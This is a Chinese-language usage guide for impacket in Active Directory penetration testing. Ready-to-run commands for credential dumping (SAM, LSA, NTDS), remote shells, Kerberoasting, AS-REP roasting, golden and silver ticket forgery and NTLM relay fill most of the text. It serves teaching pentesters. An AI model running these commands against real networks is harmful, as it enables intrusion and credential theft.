# impacket 基础用法

impacket 是一组 Python 实现的 SMB / MSRPC / Kerberos 协议库，附带 30+ 个独立可执行小工具，覆盖 Windows / AD 渗透的方方面面。绝大部分内网横向 / Kerberos 攻击 / 凭据 dump 命令都来自这里。

## 安装

```bash
pipx install impacket
# 或
pip install impacket
```

验证：

```bash
impacket-secretsdump -h
```

注意：homebrew 装的可能命令名带 `impacket-` 前缀（如 `impacket-secretsdump`），pip 装的可能直接是 `secretsdump.py`。下文统一用前缀写法。

## 通用账号语法

```
[domain/]username[:password]@target
```

例：

```
LAB.LOCAL/admin:Pass@10.0.0.5
admin@10.0.0.5                # 不带域，会问密码
.\admin:Pass@10.0.0.5         # 本地账号（用 . 当域）
```

替换密码可用 hash：

```bash
-hashes LM:NT
-hashes :8846f7eaee8fb117ad06bdd830b7586c       # 没 LM 时左边留空
```

或 Kerberos：

```bash
-k -no-pass                                       # 用当前 ccache
KRB5CCNAME=/tmp/krb.ccache impacket-secretsdump -k ...
```

## 1. secretsdump - 全方位凭据 dump

本机 SAM/LSA（admin 凭据）：

```bash
impacket-secretsdump LAB/admin:Pass@10.0.0.5
```

DC 上 NTDS（域管 / DCSync 权限）：

```bash
impacket-secretsdump -just-dc LAB/admin:Pass@10.0.0.10
impacket-secretsdump -just-dc-ntlm LAB/admin:Pass@10.0.0.10    # 仅 NTLM
```

输出 NTDS 的格式：

```
DOMAIN\admin:1001:LM:NT:::
DOMAIN\admin:aes256-cts-hmac-sha1-96:abc...
```

## 2. PsExec / WMIExec / SmbExec / AtExec - 远程 shell

| 工具 | 端口 | 隐蔽性 | 备注 |
|---|---|---|---|
| `psexec` | 445 (TCP/SMB) | 低 | 创 service，会留 event 4697 |
| `wmiexec` | 135+RPC | 中 | 不写文件，无 service |
| `smbexec` | 445 | 中 | 类似 psexec 但用 named pipe |
| `atexec` | 445 | 中 | schtasks |
| `dcomexec` | DCOM | 高 | 滥用 DCOM 对象 |

```bash
impacket-psexec LAB/admin:Pass@10.0.0.5
impacket-wmiexec LAB/admin:Pass@10.0.0.5
```

需要 admin 权限。psexec 在现代 EDR 下基本必报，wmiexec 略好。

## 3. GetNPUsers - AS-REP roasting

找域里"don't require pre-authentication"用户，拿到可以离线爆破的 AS-REP：

```bash
impacket-GetNPUsers LAB/ -no-pass -usersfile users.txt -dc-ip 10.0.0.10
```

输出 `$krb5asrep$23$...` 哈希，喂 john / hashcat（hashcat 模式 18200）。

## 4. GetUserSPNs - Kerberoasting

请求所有 SPN 的 TGS：

```bash
impacket-GetUserSPNs LAB/lowpriv:Pass@dc01.lab.local -request
```

输出 `$krb5tgs$23$...`，喂 hashcat 模式 13100。

## 5. ticketer - 伪造 ticket（黄金/白银）

需要域 KRBTGT 哈希（黄金）或服务账号 NT 哈希（白银）：

```bash
# 黄金
impacket-ticketer -nthash <KRBTGT_NT> -domain-sid S-1-5-21-... -domain LAB.LOCAL administrator

# 白银
impacket-ticketer -nthash <SVC_NT> -domain-sid S-1-5-21-... -domain LAB.LOCAL -spn cifs/srv1.lab.local administrator
```

输出 .ccache 文件，导入：

```bash
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass LAB.LOCAL/administrator@dc01.lab.local
```

## 6. ntlmrelayx - NTLM 中继

把 responder 抓到的 NTLM 验证转发到目标：

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support --no-smb-server      # 与 responder 共存
```

加 `-c "powershell -enc ..."` 直接执行命令。

## 7. lookupsid - SID 枚举

不需要登录就能列出域用户：

```bash
impacket-lookupsid LAB/lowpriv:Pass@10.0.0.10 20000
# 20000 是 RID 上限
```

## 8. addcomputer - 添加机器账号

利用 ms-DS-MachineAccountQuota 默认 10 的特性：

```bash
impacket-addcomputer LAB/lowpriv:Pass -computer-name PWNED -computer-pass Pass123 -dc-ip 10.0.0.10
```

接 RBCD 攻击常用。

## 9. smbclient - SMB 浏览

```bash
impacket-smbclient LAB/admin:Pass@10.0.0.5
nxc> shares
nxc> use IPC$
nxc> ls
nxc> get file.txt
```

## 10. rpcdump - 列 RPC 接口

```bash
impacket-rpcdump @10.0.0.5
```

## 常见坑

- DC IP / DNS 解析不通 → 加 `-dc-ip` + `--target-ip`
- 时间偏差 > 5 分钟 → Kerberos 失败：`sudo ntpdate dc01.lab.local`
- `-just-dc` 需要 Replicating Directory Changes 权限
- secretsdump 远程 dump 时会临时建 service，杀软会告警
- macOS 上 pipx 装的命令在 `~/.local/bin`，要加 PATH
